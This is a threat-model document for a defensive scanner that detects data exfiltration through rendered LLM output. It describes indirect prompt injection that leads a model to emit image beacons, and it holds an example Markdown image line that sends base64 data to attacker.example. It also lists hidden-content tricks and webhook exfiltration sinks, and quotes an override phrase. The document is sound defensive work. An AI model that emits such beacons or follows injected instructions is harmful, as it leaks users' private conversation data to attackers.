# Threat model: data exfiltration through rendered LLM output

This document explains what `llm-exfil-guard` defends against, how severity is
assigned, what the detection heuristics can and cannot do, and what this project
does **not** claim.

> **Honesty statement.** This is a detection and sanitization tool plus a
> reproducible local demonstration. It does not disclose a new vulnerability and
> does not claim a new CVE. Every attack primitive below is public prior art; the
> citations are at the end. The demo uses a fixed harmless marker string and a
> local sink server — no real credential, user account or third-party service is
> involved.

## 1. The channel: rendered output can make network requests

An LLM chat product typically renders model output as Markdown or HTML. If the
renderer emits raw HTML or loads remote resources referenced by the model's
output, then **the model's text becomes executable network capability**: the
victim's browser will fetch any URL the output names, with any query string the
output contains, from the victim's network position.

The attacker does not need the model to have tools, and often does not need the
user to click anything. Two ingredients suffice:

1. **Injection** — untrusted content (a web page, email, document, issue comment,
   tool result) makes the model include an image whose URL carries sensitive
   context. This is text generation, so even a model with no network access can
   "write out" the secret.
2. **Rendering** — the UI renders it as Markdown/HTML and the browser performs the
   automatic request.

That is why this threat class is also described as an *output-handling* bug: the
answer is to sanitize/structure the output and restrict remote loads, not only to
filter model inputs.

## 2. Attack classes covered

### 2.1 Markdown/HTML image beacons

```markdown
![build status](https://attacker.example/collect?d=Y29udmVyc2F0aW9uPWNoYXQ…)
```

Rendered as an `<img>`; the browser fetches it immediately. The secret can be in
the query, path, fragment, or a nested/base64 form. Reference-style images work
the same way (`![x][ref]` + `[ref]: https://…`), and an attacker can wrap the payload
in a long random string to look like an ordinary tracking pixel.

`EG-EXFIL-URL` (high) reports the URL together with the decoded payload when the
value is base64/JWT/high-entropy; `EG-REMOTE-ASSET` (medium) reports any untrusted
remote auto-load. Known exfiltration/webhook services are `EG-WEBHOOK` (high).

### 2.2 Other automatic remote loads

* `<iframe src>`, `<frame>`, `<object data>`, `<embed src>`, `<video>/<audio>/<source>`;
* `<link rel=stylesheet|preload|prefetch|dns-prefetch|icon>`;
* CSS `url(...)` in `<style>` blocks and `style="background-image:url(...)"`;
* `<meta http-equiv="refresh" content="0; url=…">` (automatic navigation);
* `<base href>` (rebases every relative URL in the rendered document);
* `srcset`, `form action`, `ping=` (extra requests on click), inline event
  handlers (code execution in the renderer);
* `data:` URIs (no network, but can carry active HTML/SVG and hidden payloads);
* `javascript:` / `vbscript:` / `file:` schemes.

Severity: automatic loads are medium (high when they carry encoded data or active
content), click-only links are low.

### 2.3 Hidden content: invisible to humans, readable by agents

Content can be present in the page and in the text an agent reads, while being
invisible to the user:

* CSS: `display:none`, `visibility:hidden`, `opacity:0`, `font-size:0`, white text
  on white (or `color` == `background-color`), zero size, off-screen positioning,
  `clip:rect(0…)`, `transform:scale(0)`;
* attributes: `hidden`, `inert`, `aria-hidden="true"`;
* HTML comments, `<template>`, `<noscript>`, `iframe srcdoc`;
* screen-reader-only utility classes (`sr-only`, `visually-hidden`) — these are
  classified **low** because they have a legitimate accessibility purpose, but the
  text is still agent-readable.

When hidden content contains instructions or URLs, the finding escalates to
`EG-HIDDEN-INJECTION` (high). The cleaner removes hidden *instruction containers*
and comments that carry exfiltration content, because nothing visible is lost.

### 2.4 Encoded payload markers

A URL is reported high when its query or path carries:

* base64 that decodes to printable text (especially text containing words such as
  "conversation", "token", "secret", "env");
* a JWT (`eyJ…`);
* a long high-entropy value (≥20 chars, ≥3.4 bits/char, mixed character classes);
* a known webhook/collaborator host (webhook.site, requestbin, pipedream,
  interact.sh/oast.*, Burp Collaborator, ngrok, Discord/Slack/Telegram webhook
  endpoints, …).

To avoid noise, pure hex checksums (7/8/12/32/40/64/128 hex chars), UUIDs and short
`?v=1.2.3`-style version parameters are deliberately **not** treated as payloads.

## 3. Severity model

| Severity | Meaning | Examples |
| --- | --- | --- |
| `high` | Automatic exfiltration channel carrying data, or active content | encoded payload URL; known webhook; `<script>`; event handler; `ping`; hidden instruction container |
| `medium` | Automatic remote load or hidden content without proven payload | image/iframe/CSS load from untrusted host; hidden element; HTML comment |
| `low` | Informational, click-only or legitimate-but-agent-visible | Markdown link; canonical link; `sr-only` accessibility text |

Findings are sorted by `(start, end, code)` and are deterministic for a given
input and allow-list.

## 4. Detection strategy and why false positives matter

A guard that blocks every image is unusable, so the scanner has explicit
boundaries:

* **Allow-list** — `allow_domains` (or repeated `--allow-domain`) suppresses
  findings for trusted hosts and their subdomains; the cleaner keeps those loads
  only in `allowlist` mode.
* **Code is inert** — fenced code blocks and inline code are not rendered as
  Markdown/HTML and are never auto-loaded, so they are not scanned and are
  preserved byte-for-byte by `clean()`.
* **Relative/local references** — `![x](./logo.png)` does not create an external
  request and is not reported.
* **Known-safe URL shapes** — hex digests, UUIDs, version parameters, short query
  values, and ordinary prose URLs are not high-severity findings.
* **Accessibility** — `sr-only`/`visually-hidden` content is low, not medium/high,
  unless the content itself is instructional.
* **Metadata links** — `rel=canonical/alternate/license/...` are click-only
  metadata, reported low at most.

The trade-off is explicit: a legitimate CDN image with a long signed token may be
reported high. That is a *false positive by design* for a strict guard; use the
allow-list. Conversely, payload encodings not covered by the heuristics (custom
encryption, short low-entropy IDs, payload split across tags) can evade detection.
Detection is heuristic, not a proof.

## 5. Non-goals / out of scope

* Not a semantic classifier for prompt injection in visible text. Plain text such
  as "ignore previous instructions" is not flagged unless it is hidden or carries
  an exfiltration URL.
* Not a full HTML5/CSS engine. Hiding implemented via external stylesheets, shadow
  DOM, or JS-computed styles is out of scope; inline techniques and style blocks
  are covered.
* Not a renderer. `clean()` produces safe Markdown for human/agent consumption; the
  application must still use a sanitizing renderer.
* Not a model-level guard and no claim that any model obeys/does not obey injected
  instructions. This tool addresses the *output channel*.
* Not a browser sandbox. A compromised renderer or an extension could still leak
  data by other means.
* No new vulnerability/CVE claim; no weaponized tooling. Demo markers are harmless.

## 6. Recommended deployment (defence in depth)

1. Render model output with a sanitizer that disables raw HTML and remote images by
   default; this tool is the detection/CI layer around that policy.
2. Apply `clean(output, "strip")` (or `allowlist` with a small CDN allow-list)
   before showing or storing model output.
3. Preserve evidence: use `clean(..., "report")` or `scan --json` instead of silent
   deletion, so review UIs can show what was removed.
4. Gate pipelines in CI: `python -m exfil_guard scan file --fail-on high`.
5. Do not give untrusted output authority over tools/secrets, even when rendering
   looks safe; log model-triggered actions.
6. Run a strict Content-Security-Policy (`img-src`, `connect-src`, `frame-src`) so
   that a missed beacon is still blocked by the browser.

## 7. References

1. K. Greshake et al., *Not what you've signed up for: Compromising Real-World
   LLM-Integrated Applications with Indirect Prompt Injection*,
   <https://arxiv.org/abs/2302.12173> — includes data exfiltration via Markdown
   image rendering.
2. J. Rehberger (Embrace The Red), *ChatGPT: Data Exfiltration via Markdown* /
   WebPilot, 2023:
   <https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/>
3. PromptArmor, *Data Exfiltration from Slack AI via Indirect Prompt Injection*,
   2024: <https://www.promptarmor.com/resources/data-exfiltration-from-slack-ai-via-indirect-prompt-injection>
4. EchoLeak — zero-click data exfiltration from Microsoft 365 Copilot,
   CVE-2025-32711 (Aim Security, 2025):
   <https://nvd.nist.gov/vuln/detail/CVE-2025-32711>
5. OWASP Top 10 for LLM Applications, **LLM05:2025 Improper Output Handling**:
   <https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/>
6. `webhook.site`, `requestbin`, `pipedream`, `interact.sh`/OAST services are
   legitimate debugging tools that are also abused as exfiltration sinks; their
   presence in a rendered output is a strong signal, not proof of intent.

These citations describe prior art. `llm-exfil-guard` is independent and not
affiliated with the authors or vendors above.
